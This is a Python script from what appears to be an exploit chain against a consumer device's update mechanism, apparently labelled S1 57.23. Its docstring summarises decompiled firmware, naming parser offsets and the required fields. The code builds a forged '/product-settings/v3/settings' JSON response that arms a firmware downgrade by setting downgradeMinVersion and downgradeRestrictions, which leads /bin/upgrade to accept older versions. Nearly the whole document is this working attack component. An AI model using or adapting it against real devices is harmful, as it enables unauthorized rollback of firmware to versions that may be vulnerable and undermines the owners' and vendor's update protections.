#!/usr/bin/env python3
"""Forged /product-settings/v3/settings response for the S1 57.23 arming chain.

Per the decompiled loop (docs: arming.c extract):
  FUN_102c691c does GET /product-settings/v3/settings (application/json, no redirects),
  feeds the body to the rapidjson handler whose binding table (0x104f2d74) binds:
    downgradeMinVersion        -> ctx+0x108 (string; must be non-empty to arm)
    downgradeRestrictions      -> ctx+0x14e (object-seen flag; must be present)
    allowDowngradeToPrevSWGen  -> (optional; gates the PrevSWGenMinVersion line only)
    denyDowngradeToPrevSwGenList / swgen -> optional members
Arming = restrictions-seen AND MinVersion non-empty. The writer then appends
"MinVersion: [<v>]" to /var/run/upgradeinfo, which /bin/upgrade consumes.

This module only BUILDS the JSON; serving is the responder's job.
"""
import json

def forged_settings(min_version: str = "57.16-41110", allow_prev_gen: bool = True) -> bytes:
    """Minimal-but-plausible settings document. Extra unknown keys are ignored by
    the binding-table parser (it only materialises the bound keys)."""
    doc = {
        "downgradeMinVersion": min_version,
        "downgradeRestrictions": {
            "allowDowngradeToPrevSWGen": allow_prev_gen,
            "denyDowngradeToPrevSwGenList": {"swgen": []},
        },
    }
    return (json.dumps(doc, separators=(",", ":")) + "\n").encode()

if __name__ == "__main__":
    import sys
    mv = sys.argv[1] if len(sys.argv) > 1 else "57.16-41110"
    sys.stdout.buffer.write(forged_settings(mv))
